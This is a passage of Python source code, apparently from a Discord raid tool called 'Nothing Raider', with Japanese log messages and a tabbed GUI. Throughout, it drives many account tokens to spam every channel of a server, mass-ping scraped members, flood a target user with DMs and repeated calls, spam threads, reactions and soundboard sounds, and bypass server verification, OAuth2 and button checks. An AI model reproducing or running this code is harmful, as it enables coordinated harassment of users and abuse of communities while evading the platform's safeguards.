            commands = response.json()
            for cmd in commands:
                if cmd["name"] == command_name:
                    print(f"Found global command: {cmd['name']} with ID: {cmd['id']}")
                    return cmd["id"]
            print(f"Command '{command_name}' not found globally for application {application_id}")
        else:
            print(f"Failed to fetch global commands. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching global commands: {str(e)}")
    
    return None


def stop_spammer():
    global spamming
    spamming = False
    print("Spamming stopped.")
    
def get_guild_channels(guild_id, token):
    cookies = get_discord_cookies()
    try:
        response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers(token, cookies))
        if response.status_code == 200:
            return [channel for channel in response.json() if channel['type'] == 0 or channel['type'] == 5]
        else:
            print(f'トークン {token} でサーバーのチャンネルを取得できませんでした。ステータスコード: {response.status_code}')
            return []
    except requests.exceptions.RequestException as e:
        print(f'トークン {token} でサーバーのチャンネルを取得中にエラーが発生しました: {str(e)}')
        return []

def send_message(channel_id, header, message):
    nowtime = str(datetime.now())[:-7]
    data = {'content': message}

    try:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/messages",
            headers=header,
            json=data
        )

        if response.status_code == 200:
            print(f'{nowtime} 送信成功: チャンネル {channel_id}')
        elif response.status_code == 403:
            print(f'{nowtime} チャンネル {channel_id} に送信する権限がないため、パスします。')
            forbidden_channels.add(channel_id)
        elif response.status_code == 404:
            print(f'{nowtime} チャンネル {channel_id} が見つかりません。スキップします。')
            forbidden_channels.add(channel_id)
        elif response.status_code == 429:
            retry_after = response.json().get('retry_after', 1)
            print(f'{nowtime} [レートリミット] {retry_after} 秒後に再試行します。')
            time.sleep(retry_after)
            send_message(channel_id, header, message)
        else:
            print(f'{nowtime} メッセージ送信失敗: {response.status_code} - {response.text}')
    except requests.exceptions.RequestException as e:
        print(f'{nowtime} メッセージ送信中にエラー: {str(e)}')

def worker(channel_id, header, message):
    send_message(channel_id, header, message)

def all_channel_spam(server_id, message, mass_ping=False, ping_count=0, random_string=False, messages_per_second=1.0):
    global stop_spammer
    stop_spammer = False

    if messages_per_second > 10.0:
        print(YELLOW + "警告: 10メッセージ/秒を超える設定はレートリミットに引っかかる可能性が高いです。推奨しません。" + END)

    valid_tokens = check_tokens_in_guild_multithread(tokens, server_id)
    if not valid_tokens:
        print(RED + f"No valid tokens found for guild {server_id}. Aborting." + END)
        return

    member_ids = []
    if mass_ping:
        member_ids = load_members_from_file(server_id)
        if not member_ids:
            print(YELLOW + f"No members found for guild {server_id}. Scraping now..." + END)
            valid_token = valid_tokens[0]
            channels = get_guild_channels(server_id, valid_token)
            if not channels:
                print(RED + f"No valid channels found for guild {server_id}. Aborting." + END)
                return
            channel_id = channels[0]['id']
            socket = DiscordSocket(valid_token, server_id, channel_id)
            threading.Thread(target=socket.run, daemon=True).start()
            time.sleep(15)
            member_ids = list(socket.members.keys())
            if not member_ids:
                print(RED + f"Failed to scrape members for guild {server_id}. Disabling mass ping." + END)
                mass_ping = False

    token_cycle = cycle(valid_tokens)
    max_workers = min(500, len(valid_tokens) * 10)
    sleep_interval = 1.0 / max(messages_per_second, 0.1)

    while not stop_spammer:
        token = next(token_cycle)
        channels = get_guild_channels(server_id, token)
        if not channels:
            print(YELLOW + f'No valid channels found for token {token[:25]}... Skipping.' + END)
            continue

        text_channels = [ch for ch in channels if ch.get('type') == 0 and ch.get('id') not in forbidden_channels]
        if not text_channels:
            print(YELLOW + f"No valid text channels found for token {token[:25]}..." + END)
            continue

        final_message = message
        if mass_ping and member_ids:
            pings = [f"<@{random.choice(member_ids)}>" for _ in range(min(ping_count, len(member_ids)))]
            final_message = f"{message} {' '.join(pings)}"
        if random_string:
            final_message = f"{final_message} {generate_random_string()}"

        cookies = get_discord_cookies()
        header = headers(token, cookies)
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(send_message, channel['id'], header, final_message)
                for channel in text_channels
            ]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(RED + f"Thread error: {e}" + END)

        if stop_spammer:
            break
        time.sleep(sleep_interval)

    print(GREEN + "All channel spam stopped." + END)

def stop_all_channel_spam():
    global stop_spammer
    stop_spammer = True

def write_tokens(filename, tokens):
    with open(filename, 'w') as file:
        file.write("\n".join(tokens))

def is_token_valid(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me/library', headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        print(nowtime() + RED + f'チェックが不可能なtoken: {token}. {str(e)}' + END)
        return False

def check_and_remove_invalid_tokens():
    global tokens
    valid_tokens = []
    invalid_tokens = []

    def check_token(token):
        if is_token_valid(token):
            valid_tokens.append(token)
            print(nowtime() + GREEN + f' [有効]: {token}' + END)
        else:
            invalid_tokens.append(token)
            print(nowtime() + RED + f'無効なtoken: {token}' + END)

    threads = []
    for token in tokens:
        thread = threading.Thread(target=check_token, args=(token,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    write_tokens('tokens.txt', valid_tokens)
    if invalid_tokens:
        with open('invalid_tokens.txt', 'w') as file:
            file.write("\n".join(invalid_tokens))

    tkinter.messagebox.showinfo("Info", f"Tokenチェックが完了しました。削除したtokenの数{len(tokens) - len(valid_tokens)}個")
    
    if len(valid_tokens) != len(tokens):
        print(f'削除したtokenの数{len(tokens) - len(valid_tokens)}個 無効なtokenを削除しました。')
        tokens = valid_tokens
        
        with open('tokens.txt', 'w') as f:
            f.write('\n'.join(tokens))
        
        print('tokens.txtはアップデートされました。')

def get_existing_reactions(channel_id, message_id, token):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    }

    try:
        response = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions', headers=headers)

        if response.status_code == 200:
            reactions_data = response.json()
            existing_reactions = [reaction['emoji']['name'] for reaction in reactions_data]
            return existing_reactions

        else:
            print(f'Failed to fetch reactions from message. Status code: {response.status_code}')
            return []

    except Exception as e:
        print(f'Exception occurred while fetching reactions with token: {token}. Error: {str(e)}')
        return []

def react_with_token(token, channel_id, message_id, emoji):
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    }

    url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'

    response = requests.put(url, headers=headers)
    hide_token = token[:25].rstrip() + '#'
    if response.status_code == 204:
        print(f'リアクションに成功 {emoji} : {hide_token}')
    elif response.status_code == 404:
        print(f'Failed to react with {emoji} (メッセージが存在しません): {hide_token}')
    elif response.status_code == 403:
        print(f'Failed to react with {emoji} : {hide_token}')
    else:
        print(f'Failed to react with {emoji} ステータスコード: {response.status_code}): {hide_token}')

def react_to_message(channel_id, message_id, emoji):
    threads = []
    for token in tokens:
        thread = threading.Thread(target=react_with_token, args=(token, channel_id, message_id, emoji))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

threads = []
stop_event = threading.Event()

def fake_typer(channel_id, token):
    url = f'https://discord.com/api/v9/channels/{channel_id}/typing'
    headers = {
        'Authorization': token,
    }

    while not stop_event.is_set():
        try:
            hide_token = token[:25].rstrip() + '#'
            response = requests.post(url, headers=headers)
            response.raise_for_status()
            print(f"fake typeに成功 {channel_id} | {hide_token}")
            time.sleep(5)
        except requests.exceptions.HTTPError as errh:
            print(f"HTTPエラー: {errh}")
            break
        except requests.exceptions.ConnectionError as errc:
            print(f"接続できません: {errc}")
            break
        except requests.exceptions.Timeout as errt:
            print(f"タイムアウトエラー: {errt}")
            break
        except requests.exceptions.RequestException as err:
            print(f"Request Exception: {err}")
            break

def custom_spammer(channel_id):
    global stop_custom_spammer
    stop_custom_spammer = False
    threads = []

    def spam_logic():
        while not stop_custom_spammer:
            for token in tokens:
                headers = {'Authorization': token, 'Content-Type': 'application/json'}
                random_custom = random.choice(messages)
                data = {'content': f'{random_custom}'}
                
                try:
                    response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
                    
                    if response.status_code == 200:
                        print(nowtime() + MAGENTA + f'送信成功: {token}' + END)
                        time.sleep(0.7)
                    elif response.status_code == 429:
                        retry_after = response.json().get('retry_after', 1)
                        print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
                        time.sleep(retry_after)
                    else:
                        print(nowtime() + RED + f'Failed to send message with token {token}. Status code: {response.status_code}' + END)
                
                except requests.exceptions.RequestException as e:
                    print(f'Error occurred while sending message with token {token}: {str(e)}')


    for _ in range(5):
        t = threading.Thread(target=spam_logic)
        t.start()
        threads.append(t)


    for t in threads:
        t.join()

def stop_custom_spammer():
    global stop_custom_spammer
    stop_custom_spammer = True

        
def get_user_id(token):
    headers = {'Authorization': token}
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        return response.json()['id']
    else:
        print(nowtime() + RED + f'Failed to get user ID for token {token}. Status code: {response.status_code}' + END)
        return None

def howbot(channel_id):
    if not channel_id:
        print(nowtime() + RED + 'Channel ID is invalid or empty.' + END)
        return

    os.system('title Nothing Raider - Custom Spammer Discord.gg/QRNutfWSpK')
    recent_messages = []
    user_ids = {token: get_user_id(token) for token in tokens}

    while True:
        for token in tokens:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            random_custom = random.choice(BOTmessages)
            data = {'content': f'{random_custom}'}

            try:
                response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=data)
                
                if response.status_code == 200:
                    print(nowtime() + MAGENTA + f'送信成功: {token}' + END)
                    message_data = response.json()
                    recent_messages.append(message_data)
                    if len(recent_messages) > 10: 
                        recent_messages.pop(0)
                elif response.status_code == 429:
                    retry_after = response.json().get('retry_after', 1)
                    print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
                    time.sleep(retry_after)
                else:
                    print(nowtime() + RED + f'Failed to send message with token {token}. Status code: {response.status_code}' + END)

                if random.choice([True, False]) and recent_messages:  
                    reply_message = random.choice(recent_messages)
                    if reply_message['author']['id'] != user_ids[token]:  
                        random_custom2 = random.choice(BOTmessages)
                        reply_data = {'content': random_custom2, 'message_reference': {'message_id': reply_message['id']}}
                        reply_response = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages', headers=headers, json=reply_data)
                        
                        if reply_response.status_code == 200:
                            print(nowtime() + MAGENTA + f'リプライ送信成功: {token}' + END)
                        elif reply_response.status_code == 429:
                            retry_after = reply_response.json().get('retry_after', 1)
                            print(nowtime() + YELLOW + f'[レートリミット] Retrying after {retry_after} seconds.' + END)
                            time.sleep(retry_after)
                        else:
                            print(nowtime() + RED + f'リプライ送信失敗: {token}. Status code: {reply_response.status_code}' + END)

            except requests.exceptions.RequestException as e:
                print(nowtime() + RED + f'Error occurred while sending message with token {token}: {str(e)}' + END)
                
            time.sleep(random.uniform(1, 5)) 

def change_status(token):
    url = "wss://gateway.discord.gg/?v=9&encoding=json"
    
    def on_message(ws, message):
        message_data = json.loads(message)
        
        if message_data.get("op") == 10:
            heartbeat_interval = message_data["d"]["heartbeat_interval"] / 1000
            heartbeat_thread = threading.Thread(target=send_heartbeat, args=(ws, heartbeat_interval))
            heartbeat_thread.start()
            identify_payload = {
                "op": 2,
                "d": {
                    "token": token,
                    "intents": 513, 
                    "properties": {
                        "$os": "linux",
                        "$browser": "my_library",
                        "$device": "my_library"
                    },
                    "presence": {
                        "status": "online",
                        "activities": [
                            {
                                "name": "",
                                "type": 0
                            }
                        ]
                    }
                }
            }
            ws.send(json.dumps(identify_payload))
    
    def on_error(ws, error):
        print(f"WebSocket error occurred: {error}")
    
    def on_close(ws, close_status_code, close_msg):
        print(f"WebSocket connection closed: {close_status_code} - {close_msg}")
    
    def on_open(ws):
        print(f"WebSocket connection opened for token: {token}")
    
    def send_heartbeat(ws, interval):
        while True:
            time.sleep(interval)
            ws.send(json.dumps({"op": 1, "d": None}))
    
    ws = websocket.WebSocketApp(url,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close,
                                on_open=on_open)
    
    ws.run_forever()

def set_avatar(token, avatar_path):
    headers = {
        'Authorization': f'{token}',
        'Content-Type': 'multipart/form-data'
    }
    with open(avatar_path, 'rb') as f:
        data = {
            'avatar': f
        }
        url = f"{BASE_URL}/users/@me"
        response = requests.patch(url, headers=headers, files=data)
        if response.status_code == 200:
            print(f"Successfully set avatar for token: {token}")
        else:
            print(f"Failed to set avatar for token: {token}. Status code: {response.status_code}")
            
def nonce():
    date = datetime.now()
    unixts = time.mktime(date.timetuple())
    return (int(unixts)*1000-1420070400000)*4194304

def read_tokens(filename):
    with open(filename, 'r') as file:
        tokens2 = [line.strip() for line in file]
    return tokens2

def read_tokens_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            tokens = file.read().splitlines()
        return tokens
    except Exception as e:
        print(f"Failed to read tokens from file: {e}")
        return []

def change_global_name(token, new_name):
    url = "https://discord.com/api/v9/users/@me"
    cookies = get_discord_cookies()
    payload = {
        "global_name": new_name
    }
    try:
        response = session.patch(url, json=payload, headers=get_headers(token))
        if response.status_code == 200:
            print(f"Username changed successfully to: {new_name} for token: {token[:10]}...")
        elif response.status_code == 400:
            error_data = response.json()
            if "captcha_key" in error_data:
                print(f"Captcha required for token {token[:10]}. Update your app and solve captcha manually.")
            else:
                print(f"Failed to change username for token {token[:10]}: {response.status_code} - {response.text}")
        else:
            print(f"Failed to change username for token {token[:10]}: {response.status_code} - {response.text}")
    except requests.RequestException as e:
        print(f"An error occurred for token {token[:10]}: {e}")

stop_call_spammer = False
count = 0
    
def open_dm(token, user_id):
    try:
        session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
        r = session.post("https://discord.com/api/v9/users/@me/channels", headers=get_headers(token), json={"recipients": [user_id]})
        channel_id = r.json()["id"]
        return channel_id
    except Exception as e:
        print(f"{RED}[失敗] DMチャンネル作成エラー: {e}{END}")
        return None

def call_spammer(token, user_id):
    global count, stop_call_spammer
    channel_id = open_dm(token, user_id)
    if channel_id is not None:
        ws = websocket.WebSocket()
        try:
            ws.connect("wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream")
            ws.send(json.dumps({"op": 2, "d": {"token": token, "properties": {"$os": "Windows"},}}))
            while not stop_call_spammer:
                ws.send(json.dumps({"op": 4, "d": {"guild_id": None, "channel_id": channel_id, "self_mute": True, "self_deaf": False, "self_video": False, "flags": 2}}))
                time.sleep(1)
                ws.send(json.dumps({"op": 4, "d": {"guild_id": None, "channel_id": None, "self_mute": True, "self_deaf": False, "self_video": False, "flags": 2}}))
                count += 1
                time.sleep(random.uniform(2, 5))
                hide_token = token[:25].rstrip() + '*'
                print(f"{GREEN}[成功] 通話 {count} 回目{END}{MAGENTA}{hide_token}{END}")
        except Exception as e:
            hide_token = token[:25].rstrip() + '*'
            print(f"{RED}[失敗] {e}{END}{MAGENTA}{hide_token}{END}")
        finally:
            ws.close()
    else:
        hide_token = token[:25].rstrip() + '*'
        print(f"{RED}[失敗] DMチャンネル作成に失敗{END}{MAGENTA}{hide_token}{END}")

def process_callspammer(tokens, user_id):
    threads = []
    for token in tokens:
        token = token.strip()
        thread = threading.Thread(target=call_spammer, args=(token, user_id))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    print("Call Spammer completed. Press Enter to continue...")
    input("continue:")
    os.system("cls")

def stop_call_spammer_fn():
    global stop_call_spammer
    stop_call_spammer = True
    print("Call Spammer stopped.")

def start_call(token, channel_id):
    url = f"wss://gateway.discord.gg/?v=9&encoding=json"
    cookie = get_discord_cookies()

    def on_open(ws):
        print("通話を開始しました。")


        identify_payload = {
            "op": 2,
            "d": {
                "token": token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1
                }
            }
        }
        ws.send(json.dumps(identify_payload))


        start_call_payload = {
            "op": 4,
            "d": {
                "guild_id": None,
                "channel_id": channel_id,
                "self_mute": False,
                "self_deaf": False
            }
        }
        ws.send(json.dumps(start_call_payload))

    def on_error(ws, error):
        print(f"WebSocket error: {error}")

    def on_close(ws):
        print("WebSocket connection closed")

    ws = websocket.WebSocketApp(
        url,
        on_open=on_open,
        on_error=on_error,
        on_close=on_close,
        header=headers(token, cookie)
    )

    ws.run_forever()
    
def spam_dm(token, channel_id, message):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    cookies = get_discord_cookies()
    payload = {
        "content": message
    }

    try:
        response = session.post(
            url,
            headers=headers(token, cookies),
            json=payload
        )

        if response.status_code == 200:
            print(f"Message sent successfully to channel ID: {channel_id}")
        else:
            error_message = response.json().get("message", YELLOW + "[CAPTCHA]" + END)
            print(f"Failed to send message: {error_message}")

    except requests.RequestException as e:
        print(f"An error occurred: {e}")

def open_dm_and_spam(user_id, message, dm_spam, call_spam, token):
    global stop_spamming

    while not stop_spamming:
        channel_id = open_dm(token, user_id)
        if channel_id:
            if dm_spam:
                spam_dm(token, channel_id, message)
            if call_spam:
                start_call(token, channel_id)
        else:
            print("DM チャネルの作成に失敗しました。")

def read_tokens(file_path):
    with open(file_path, "r") as file:
        return file.read().splitlines()

def vc_joiner(token, guild, channel):
    try:
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
        ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": token,
                "properties": {
                    "$os": "windows",
                    "$browser": "Discord",
                    "$device": "desktop"
                }
            }
        }))
        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": guild,
                "channel_id": channel,
                "self_mute": False,
                "self_deaf": False
            }
        }))
        print(f"Joined VC with token: {token[:25]}...")
    except Exception as e:
        print(f"Failed to join VC with token: {token[:25]}... Error: {e}")

def soundboard(token, channel_id):
    try:
        session = requests.Session()
        cookies = get_discord_cookies()
        sounds = session.get(
            "https://discord.com/api/v9/soundboard-default-sounds",
            headers=headers(token, cookies)
        ).json()

        while True:
            sound = random.choice(sounds)
            name = sound.get("name")
            payload = {
                "emoji_id": None,
                "emoji_name": sound.get("emoji_name"),
                "sound_id": sound.get("sound_id"),
            }

            response = session.post(
                f'https://discord.com/api/v9/channels/{channel_id}/send-soundboard-sound', 
                headers=headers(token, cookies), 
                json=payload,
            )

            if response.status_code == 204:
                print(f"サウンドの再生に成功！ {name}")
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after")
                print(f"レートリミット - {retry_after}秒後に再試行。")
                time.sleep(float(retry_after))
            else:
                print(f"Failed to play sound: {response.json().get('message')}")
    except Exception as e:
        print(f"音声を再生できません。: {e}")

def fetch_form_fields(token, guild_id):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
    params = {"with_guild": "true"}
    try:
        response = requests.get(url, headers=get_headers(token), params=params)
        response.raise_for_status()
        return response.json().get('form_fields', [])
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred while fetching form fields: {err}")
        return []
    except Exception as err:
        print(f"An error occurred while fetching form fields: {err}")
        return []

def rule_bypass(token, guild_id):
    url_get = f"https://discord.com/api/v9/guilds/{guild_id}/member-verification"
    params = {"with_guild": "true"}
    
    try:
        response_get = requests.get(url_get, headers=get_headers(token), params=params)
        response_get.raise_for_status()
        verification_info = response_get.json()
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred during GET request: {err}")
        return
    except Exception as err:
        print(f"An error occurred during GET request: {err}")
        return

    version = verification_info.get('version')
    if not version:
        print("バージョンの取得に失敗....")
        return

    form_fields = fetch_form_fields(token, guild_id)
    if not form_fields:
        print("フォームフィールドを取得できませんでした。.")
        return

    url_put = f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me"
    payload = {
        "version": version,
        "form_fields": form_fields
    }

    headers = get_headers(token)

    try:
        response_put = requests.put(url_put, headers=headers, json=payload)
        response_put.raise_for_status()
        print("認証を完了しました！")
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred during PUT request: {err}")
        print(f"Response content: {response_put.content.decode()}") 
    except Exception as err:
        print(f"An error occurred during PUT request: {err}")


def Oauth2_verify_bypass(guild_id, token):
    state = generate_precise_state(guild_id)
    
    params = {
        'client_id': 'ここにbotのid',
        'response_type': 'code',
        'redirect_uri': 'ここにbotのリダイレクトurl',
        'scope': 'ここにscope',
        'state': state,
    }

    json_data = {
        'guild_id': guild_id,
        'permissions': '0',
        'authorize': True,
        'integration_type': 0,
        'location_context': {
            'guild_id': '10000',
            'channel_id': '10000',
            'channel_type': 10000,
        },
    }

    response = requests.post(
        'https://discord.com/api/v9/oauth2/authorize',
        params=params,
        headers=get_headers(token),
        json=json_data,
    )

    if response.status_code == 200:
        json_response = response.json()
        if "location" in json_response:
            url = json_response["location"]
            response_url = requests.get(url)

            if response_url.status_code == 200:
                print("成功!!")
            else:
                print(f"Error {response_url.status_code}: {response_url.text}")
        else:
            print("urlが存在しません。")
    else:
        print(f"Error {response.status_code}: {response.text}")


def auto_oauth2(client_id, token):    
    params = {
        'client_id': client_id,
        'scope': 'applications.commands',
    }

    json_data = {
        'permissions': '0',
        'authorize': True,
        'integration_type': 1,
        'location_context': {
            'guild_id': '10000',
            'channel_id': '1000',
            'channel_type': 3,
        },
        'dm_settings': {
            'allow_mobile_push': False,
        },
    }

    raw_cookies = get_discord_cookies()
    parsed_cookies = parse_cookie_string(raw_cookies)

    response = requests.post(
        'https://discord.com/api/v9/oauth2/authorize',
        params=params,
        headers=get_headers(token),
        cookies=parsed_cookies,
        json=json_data,
    )

    if response.status_code == 200:
        json_response = response.json()
        if "location" in json_response:
            url = json_response["location"]
            response_url = requests.get(url)

            if response_url.status_code == 200:
                print("連携が完了")
            else:
                print(f"Error {response_url.status_code}: {response_url.text}")
        else:
            print("urlが存在しません。")
    else:
        print(f"Error {response.status_code}: {response.text}")

def get_user_id_from_token(token):
    url = "https://discord.com/api/v9/users/@me"
    
    try:
        response = requests.get(url, headers=get_headers(token))
        response.raise_for_status()
        user_data = response.json()
        return user_data['id']
    except requests.exceptions.HTTPError as err:
        print(f"HTTP error occurred while getting user ID: {err}")
        return None
    except Exception as err:
        print(f"An error occurred while getting user ID: {err}")
        return None

def get_random_image_file():
    valid_exts = ('.png', '.jpg', '.jpeg')
    image_files = [file for file in os.listdir(PICTURE_FOLDER) if file.lower().endswith(valid_exts)]
    if not image_files:
        raise FileNotFoundError("悲しいことに画像ファイルは出掛けてしまった！！")
    return os.path.join(PICTURE_FOLDER, random.choice(image_files))

def change_avatar(token):
    url = "https://discord.com/api/v9/users/@me"
    image_path = get_random_image_file()

    with open(image_path, 'rb') as image_file:
        image_data = image_file.read()

    mime_type = mimetypes.guess_type(image_path)[0] or "image/png"
    image_base64 = base64.b64encode(image_data).decode('utf-8')

    payload = {
        "avatar": f"data:{mime_type};base64,{image_base64}"
    }

    hide_token = token[:25].rstrip() + '#'

    try:
        response = session.patch(url, headers=get_headers(token), json=payload)
        if response.status_code == 200:
            print(f"✅ アバターの変更に成功 {hide_token}")
        else:
            print(f"❌ アバターの変更に失敗 Onlinerを試してください。 {hide_token} Status code: {response.status_code}")
    except requests.exceptions.RequestException as err:
        print(f"❌ 不明なエラーによりアバターの変更に失敗 {hide_token}: {err}")

def start_avatar_change_threads():
    threads = []
    for token in tokens:
        thread = threading.Thread(target=change_avatar, args=(token,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def button_bypass(token, message_id, channel_id, guild_id, button_option):
    try:
        payload = {
            'limit': '50',
            'around': message_id,
        }

        response = session.get(
            f'https://discord.com/api/v9/channels/{channel_id}/messages',
            params=payload,
            headers=get_headers(token)
        )
        hide_token = token[:25].rstrip() + '#'
        if response.status_code != 200:
            print(f"サーバーに入っていません | {hide_token}")
            return

        try:
            messages = response.json()
        except ValueError:
            print("レスポンスに無効なデータが含まれています。")
            return

        if isinstance(messages, list):
            messagebottoclick = next((x for x in messages if x["id"] == message_id), None)
        else:
            print("メッセージが届いた:", type(messages))
            return

        if messagebottoclick is None:
            print("Message not found")
            return

        buttons = []
        for component in messagebottoclick.get("components", []):
            for button in component.get("components", []):
                buttons.append(button)

        if not buttons:
            print("ボタンはありません。")
            return

        button_index = int(button_option) - 1

        if button_index < 0 or button_index >= len(buttons):
            print("無効なボタンです。")
            return

        data = {
            'application_id': messagebottoclick["author"]["id"],
            'channel_id': channel_id,
            'data': {
                'component_type': 2,
                'custom_id': buttons[button_index]["custom_id"],
            },
            'guild_id': guild_id,
            'message_flags': 0,
            'message_id': message_id,
            'nonce': nonce(),
            'session_id': uuid.uuid4().hex,
            'type': 3,
        }

        response = session.post(
            'https://discord.com/api/v9/interactions',
            headers=get_headers(token),
            json=data
        )

        if response.status_code == 204:
            print("成功", f"{token[:25]}##")
        else:
            print("失敗", f"{token[:25]}##")
    except Exception as e:
        print("失敗", "ボタンのクリックに失敗", e)

def thread_spam(token, channel_id, name):
    url = f'https://discord.com/api/v9/channels/{channel_id}/threads'
    
    while True:
        try:
            payload = {
                'name': f'{name}|{uuid.uuid4().hex}',
                'type': 11,
                'auto_archive_duration': random.choice([60, 1440, 4320, 10080]),
            }

            response = requests.post(url, headers=get_headers(token), json=payload)
            
            if response.status_code == 201:
                print("スレッド作成成功")
            else:
                print(f"スレッド作成失敗 | {response.status_code}, {response.text}")
        except Exception as e:
            print(f"エラーが発生しました: {e}")

def server_boost(guild_id, boost_count, token):
    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
    url2 = "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots"

    response_get = requests.get(url2, headers=get_headers(token))
    if response_get.status_code != 200:
        print(f"トークン {token} でブーストスロットの取得に失敗: ステータスコード {response_get.status_code}")
        return 0

    slots = response_get.json()
    available_slots = [slot['id'] for slot in slots if not slot.get('premium_guild_subscription_id')]

    if not available_slots:
        print(f"トークン {token} で利用可能なスロットがありません。")
        return 0

    boost_to_use = min(boost_count, len(available_slots))
    payload = {
        'user_premium_guild_subscription_slot_ids': available_slots[:boost_to_use]
    }

    response = requests.put(url, headers=get_headers(token), json=payload)
    if response.status_code in (200, 201):
        print(f"トークン {token} で {boost_to_use} 回のブーストに成功しました。")
        return boost_to_use
    else:
        print(f"トークン {token} でブーストに失敗しました: ステータスコード {response.status_code}")
        return 0

def boost_with_multiple_tokens(guild_id, boost_count):
    with open('tokens.txt', 'r') as file:
        tokens = [line.strip() for line in file.readlines()]

    remaining_boosts = boost_count
    for token in tokens:
        if remaining_boosts <= 0:
            print("すべてのブーストが完了しました。")
            break

        print(f"トークン {token} を使用してブーストを試みます。")
        boosts_done = server_boost(guild_id, remaining_boosts, token)

        remaining_boosts -= boosts_done
        print(f"残りのブースト回数: {remaining_boosts}")

    if remaining_boosts > 0:
        print(f"指定されたブースト回数 {boost_count} を達成できませんでした。残り: {remaining_boosts}")
    else:
        print("すべての指定されたブーストが完了しました。")

def switch_to_main_ui():
    for widget in root.winfo_children():
        widget.destroy()
    setup_main_ui()

def setup_main_ui():
    tab_buttons_frame = ctk.CTkFrame(root, width=150)
    tab_buttons_frame.pack(side="left", fill="y")

    tab_buttons_canvas = ctk.CTkCanvas(tab_buttons_frame, width=150)
    tab_buttons_canvas.pack(side="left", fill="both", expand=True)

    scrollbar = ctk.CTkScrollbar(tab_buttons_frame, orientation="vertical", command=tab_buttons_canvas.yview)
    scrollbar.pack(side="right", fill="y")
    tab_buttons_canvas.configure(yscrollcommand=scrollbar.set)

    tab_buttons_inner_frame = ctk.CTkFrame(tab_buttons_canvas, width=150)
    tab_buttons_canvas.create_window((0, 0), window=tab_buttons_inner_frame, anchor="nw")

    tab_buttons_inner_frame.bind("<Configure>", lambda e: tab_buttons_canvas.configure(scrollregion=tab_buttons_canvas.bbox("all")))

    def _on_mouse_wheel(event):
        tab_buttons_canvas.yview_scroll(int(-1*(event.delta/120)), "units")

    tab_buttons_canvas.bind_all("<MouseWheel>", _on_mouse_wheel)

    create_tab_button(tab_buttons_inner_frame, "Joiner", lambda: switch_tab(joiner_tab))
    create_tab_button(tab_buttons_inner_frame, "Leaver", lambda: switch_tab(leaver_tab))
    create_tab_button(tab_buttons_inner_frame, "Guild Checker", lambda: switch_tab(check_guild_tab))
    create_tab_button(tab_buttons_inner_frame, "Invite Spammer", lambda: switch_tab(new_invite_spammer_tab))
    create_tab_button(tab_buttons_inner_frame, "Booster", lambda: switch_tab(boost_tab))
    create_tab_button(tab_buttons_inner_frame, "OLD Spammer", lambda: switch_tab(spammerOLD_tab))
    create_tab_button(tab_buttons_inner_frame, "Token Checker", lambda: switch_tab(check_tokens_tab))
    create_tab_button(tab_buttons_inner_frame, "Reaction", lambda: switch_tab(reaction_tab))
    create_tab_button(tab_buttons_inner_frame, "Fake Typer", lambda: switch_tab(fake_typer_tab))
    create_tab_button(tab_buttons_inner_frame, "All Channel Spam", lambda: switch_tab(all_channel_spam_tab))
    create_tab_button(tab_buttons_inner_frame, "Bot", lambda: switch_tab(bot_tab))
    create_tab_button(tab_buttons_inner_frame, "Onliner", lambda: switch_tab(onliner_tab))
    create_tab_button(tab_buttons_inner_frame, "New Spammer", lambda: switch_tab(new_spammer_tab))
    create_tab_button(tab_buttons_inner_frame, "Group Spammer", lambda: switch_tab(new_group_creator_tab))
    create_tab_button(tab_buttons_inner_frame, "Command spammer", lambda: switch_tab(command_spammer_tab))
